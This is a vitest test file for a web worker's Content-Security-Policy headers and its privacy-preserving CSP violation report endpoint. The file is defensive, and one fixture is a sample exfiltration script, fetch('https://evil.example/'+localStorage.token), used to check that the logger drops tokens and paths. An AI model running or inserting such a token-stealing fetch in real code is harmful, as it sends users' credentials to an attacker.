/**
 * The report-only script policy reaches every app document, and its reports
 * come back to a log that keeps origins only: never a note's path, a token in
 * a query, or the script text a browser may attach.
 */
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { join } from "node:path";

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import worker from "./index";
import {
  CSP_REPORT_PATH,
  EDITOR_POLICY,
  EDITOR_STYLE_HASHES,
  EMPTY_STYLE_HASH,
  fetchDirectives,
  parseCspReport,
  reportOnlyPolicyFor,
  SCRIPT_POLICY,
  SHELL_SCRIPT_HASHES,
  SHELL_STYLE_HASHES,
} from "./cspReport";
import { ENFORCED_POLICY, SECURITY_HEADERS } from "./securityHeaders";
import { PLUGIN_SANDBOX_PREFIX } from "./pluginSandbox";

const CTX = { waitUntil: (promise: Promise<unknown>) => void promise, passThroughOnException: () => {} } as unknown as ExecutionContext;
const assets = vi.fn(() => new Response("<!doctype html>", { headers: { "Content-Type": "text/html" } }));
const ENV = { CONVEX_ORIGIN: "https://example-deployment.convex.site", ASSETS: { fetch: assets } as unknown as Fetcher };

let logs: string[];
beforeEach(() => {
  logs = [];
  vi.stubGlobal("fetch", vi.fn(() => new Response("upstream")));
  vi.spyOn(console, "log").mockImplementation((line: string) => void logs.push(line));
});
afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

function report(body: unknown, init: RequestInit = {}): Promise<Response> {
  const request = new Request(`https://context.lc${CSP_REPORT_PATH}`, {
    method: "POST",
    headers: { "Content-Type": "application/csp-report" },
    body: JSON.stringify(body),
    ...init,
  });
  return worker.fetch(request, ENV, CTX) as Promise<Response>;
}

const LEAKY = {
  "document-uri": "https://context.lc/note/@acme/projects/secret-merger.md?token=abc123",
  "blocked-uri": "https://evil.example/steal.js?t=abc123",
  "effective-directive": "script-src-elem",
  "script-sample": "fetch('https://evil.example/'+localStorage.token)",
};

describe("the policy", () => {
  it("is report-only on the app document and names the report path", async () => {
    const response = await worker.fetch(new Request("https://context.lc/console"), ENV, CTX);
    expect(response.headers.get("Content-Security-Policy-Report-Only")).toBe(`${fetchDirectives(ENV.CONVEX_ORIGIN)}; ${SCRIPT_POLICY}`);
    expect(SCRIPT_POLICY).toContain(`report-uri ${CSP_REPORT_PATH}`);
    expect(SCRIPT_POLICY).toContain("object-src 'none'");
    // Enforcing CSP says who may frame, where forms go, and bars plugins and <base>; scripts and styles are not blocked yet.
    expect(response.headers.get("Content-Security-Policy")).toBe(ENFORCED_POLICY);
  });

  it("allows no host it does not need", () => {
    const hosts = SCRIPT_POLICY.match(/https:\/\/[^\s;]+/g) ?? [];
    expect(hosts).toEqual([
      "https://challenges.cloudflare.com",
      "https://static.cloudflareinsights.com",
      "https://static.ads-twitter.com",
      "https://connect.facebook.net",
    ]);
    expect(SCRIPT_POLICY).not.toMatch(/'unsafe-inline'|'unsafe-eval'|\*/);
  });

  // The shell's inline scripts run by hash. One edited without its hash here
  // would be blocked once the policy enforces, so the two are pinned together.
  it("names every inline script in the web shell by its hash, and no other", () => {
    const shell = readFileSync(join(__dirname, "..", "..", "..", "apps", "mobile", "public", "index.html"), "utf8");
    const inline = [...shell.matchAll(/<script([^>]*)>([\s\S]*?)<\/script>/g)]
      .filter(([, attrs]) => !/\bsrc=|\btype="application\/(?:ld\+)?json"/.test(attrs))
      .map(([, , body]) => `sha256-${createHash("sha256").update(body, "utf8").digest("base64")}`);
    expect(inline.length).toBeGreaterThan(0);
    expect(SHELL_SCRIPT_HASHES).toEqual(inline);
    for (const hash of inline) expect(SCRIPT_POLICY).toContain(`'${hash}'`);
  });

  // The style candidate is measured the same way: the shell's inline styles
  // by hash, the empty sheet React Native Web fills by insertRule, and never
  // 'unsafe-inline'.
  it("names every inline style in the web shell by its hash, plus the empty sheet, and nothing unsafe", () => {
    const shell = readFileSync(join(__dirname, "..", "..", "..", "apps", "mobile", "public", "index.html"), "utf8");
    const inline = [...shell.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/g)].map(
      ([, body]) => `sha256-${createHash("sha256").update(body, "utf8").digest("base64")}`,
    );
    expect(inline.length).toBeGreaterThan(0);
    expect(SHELL_STYLE_HASHES).toEqual(inline);
    expect(EMPTY_STYLE_HASH).toBe(`sha256-${createHash("sha256").update("", "utf8").digest("base64")}`);
    const style = SCRIPT_POLICY.split(";").map((part) => part.trim()).find((part) => part.startsWith("style-src "));
    expect(style).toBe(`style-src 'self' ${[...inline, EMPTY_STYLE_HASH].map((hash) => `'${hash}'`).join(" ")}`);
  });

  // Two frames run script this policy would block, and a quiet report log
  // cannot show it: they run only when someone opens a plugin or exports a
  // drawing. The plugin sandbox runs its bootstrap and each plugin as inline
  // script, which a `srcdoc` frame would run under the app's policy; the
  // drawing editor's bundled WebAssembly glue builds functions with
  // `new Function`. Until each has a document and a policy of its own, the
  // policy stays report-only.
  it("stays report-only while a frame of ours needs inline script or eval", () => {
    const repo = join(__dirname, "..", "..", "..");
    const sandbox = readFileSync(join(repo, "packages", "obsidian-runtime", "src", "sandbox", "lifecycle.js"), "utf8");
    // The editor bundle is built, not committed; the dependency that brings
    // the `new Function` in is.
    const app = JSON.parse(readFileSync(join(repo, "apps", "mobile", "package.json"), "utf8")) as { dependencies?: Record<string, string> };
    // The drawing editor is a document of its own, framed by URL: it stops
    // holding the shell back once that document has a policy of its own.
    const editorShared = reportOnlyPolicyFor("/drawing-assets/editor/index.html", undefined) === reportOnlyPolicyFor("/console", undefined);
    const host = readFileSync(join(repo, "apps", "mobile", "features", "console", "plugins", "PluginSandbox.web.tsx"), "utf8");
    const sandboxShared = /\bsrcDoc=/.test(host) || reportOnlyPolicyFor(PLUGIN_SANDBOX_PREFIX, undefined) === reportOnlyPolicyFor("/console", undefined);
    const needs = [
      ...(/script\.textContent\s*=/.test(sandbox) && sandboxShared ? ["plugin sandbox: inline script in a srcdoc frame"] : []),
      ...(app.dependencies?.["@excalidraw/excalidraw"] && editorShared ? ["drawing editor: Excalidraw's WebAssembly glue calls new Function"] : []),
    ];
    if (needs.length > 0) expect(SECURITY_HEADERS["Content-Security-Policy"], needs.join("; ")).not.toContain("script-src");
  });

  it("gives the drawing editor its own policy, and only it may build functions", async () => {
    const editor = await worker.fetch(new Request("https://context.lc/drawing-assets/editor/index.html"), ENV, CTX);
    expect(editor.headers.get("Content-Security-Policy-Report-Only")).toBe(`${fetchDirectives(ENV.CONVEX_ORIGIN)}; ${EDITOR_POLICY}`);
    expect(EDITOR_POLICY).toContain("'unsafe-eval'");
    expect(EDITOR_POLICY).not.toMatch(/'unsafe-inline'|\*/);
    for (const path of ["/console", "/", "/drawing-assets/editorial", "/drawing-assets/page/index.html"]) {
      expect(reportOnlyPolicyFor(path, ENV.CONVEX_ORIGIN), path).not.toContain("'unsafe-eval'");
    }
    // Its one inline block is a style, named by hash. The page is built, not
    // committed, so it is read from the function that writes it.
    const script = readFileSync(join(__dirname, "..", "..", "..", "scripts", "build-drawing-editor.mjs"), "utf8");
    const page = /function pageHtml\(\) \{\n  return `([\s\S]*?)`;\n\}/.exec(script)?.[1] ?? "";
    expect(page).toContain('<script type="module" src="./editor.js"></script>');
    expect(page).not.toMatch(/<script(?![^>]*\bsrc=)[^>]*>/);
    const inline = [...page.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/g)].map(
      ([, body]) => `sha256-${createHash("sha256").update(body, "utf8").digest("base64")}`,
    );
    expect(EDITOR_STYLE_HASHES).toEqual(inline);
  });

  it("measures a default-src candidate with no wildcard source and no deployment name written in", () => {
    const directives = fetchDirectives("https://example-deployment.convex.site");
    expect(directives.startsWith("default-src 'self'")).toBe(true);
    const connect = directives.split("; ").find((part) => part.startsWith("connect-src "));
    expect(connect).toContain("https://example-deployment.convex.site");
    expect(connect).toContain("https://example-deployment.convex.cloud");
    expect(connect).toContain("wss://example-deployment.convex.cloud");
    for (const part of directives.split("; ")) {
      const sources = part.split(" ").slice(1);
      // No bare `*`, no bare scheme beyond the data and blob URLs the app builds itself.
      expect(sources.filter((source) => source === "*" || /^(https?|wss?):$/.test(source)), part).toEqual([]);
      expect(part).not.toMatch(/'unsafe-/);
    }
    expect(fetchDirectives(undefined)).not.toContain("convex");
    expect(fetchDirectives("not a url")).not.toContain("convex");
  });
});

describe("the report endpoint", () => {
  it("logs the directive and origins, and nothing else from the report", async () => {
    const response = await report({ "csp-report": LEAKY });
    expect(response.status).toBe(204);
    expect(await response.text()).toBe("");
    expect(logs).toHaveLength(1);
    expect(JSON.parse(logs[0])).toEqual({
      event: "csp_report_only_violation",
      directive: "script-src-elem",
      blocked: "https://evil.example",
      page: "https://context.lc",
      document: "shared-note",
    });
    expect(logs[0]).not.toMatch(/secret-merger|abc123|localStorage|steal|acme|projects/);
  });

  it("reads the Reporting API's array shape", () => {
    expect(
      parseCspReport(JSON.stringify([{ type: "csp-violation", body: { documentURL: LEAKY["document-uri"], blockedURL: "inline", effectiveDirective: "script-src-elem" } }, { type: "deprecation", body: {} }])),
    ).toEqual([{ directive: "script-src-elem", blocked: "inline", page: "https://context.lc", document: "shared-note" }]);
  });

  it("never logs a directive or keyword it does not recognise verbatim", () => {
    const [violation] = parseCspReport(JSON.stringify({ "csp-report": { "effective-directive": "x; secret note text", "blocked-uri": "notes about the merger" } }));
    expect(violation).toEqual({ directive: "unknown", blocked: "unparsed", page: "none", document: "none" });
  });

  it("names which of our documents a report came from, by class and never by path", () => {
    const from = (documentURL: string) =>
      parseCspReport(JSON.stringify([{ type: "csp-violation", body: { documentURL, blockedURL: "inline", effectiveDirective: "script-src-elem" } }]))[0].document;
    expect(from("https://context.lc/")).toBe("shell");
    expect(from("https://tex.lc/settings?tab=x")).toBe("shell");
    expect(from("https://context.lc/console/@acme/projects/secret.md")).toBe("console");
    expect(from("https://context.lc/console")).toBe("console");
    expect(from("https://context.lc/consoles")).toBe("shell");
    expect(from("https://context.lc/drawing-assets/editor/")).toBe("drawing-editor");
    expect(from("https://context.lc/drawing-assets/plugin-sandbox/index.html")).toBe("plugin-sandbox");
    expect(from("https://context.lc/drawing-assets/page/box.html")).toBe("page-runtime");
    expect(from("https://context.lc/drawing-assets/diagram/")).toBe("drawing-assets");
    expect(from("https://context.lc/note/@acme/a.md")).toBe("shared-note");
    expect(from("about:srcdoc")).toBe("srcdoc");
    expect(from("about")).toBe("about");
    expect(from("about:blank")).toBe("about");
    expect(from("blob:https://context.lc/1234")).toBe("other-scheme");
    expect(from("not a url at all")).toBe("unparsed");
  });

  it("answers anything that is not a POST with 405, and logs nothing", async () => {
    const response = await worker.fetch(new Request(`https://context.lc${CSP_REPORT_PATH}`), ENV, CTX);
    expect(response.status).toBe(405);
    expect(logs).toEqual([]);
    expect(assets).not.toHaveBeenCalledWith(expect.objectContaining({ url: expect.stringContaining(CSP_REPORT_PATH) }));
  });

  it("refuses an oversized body without reading it", async () => {
    const response = await report({ "csp-report": LEAKY }, { headers: { "Content-Length": String(1024 * 1024) } });
    expect(response.status).toBe(413);
    expect(logs).toEqual([]);
  });

  it("treats junk as no violations", async () => {
    const response = await worker.fetch(new Request(`https://context.lc${CSP_REPORT_PATH}`, { method: "POST", body: "not json" }), ENV, CTX);
    expect(response.status).toBe(204);
    expect(logs).toEqual([]);
  });
});
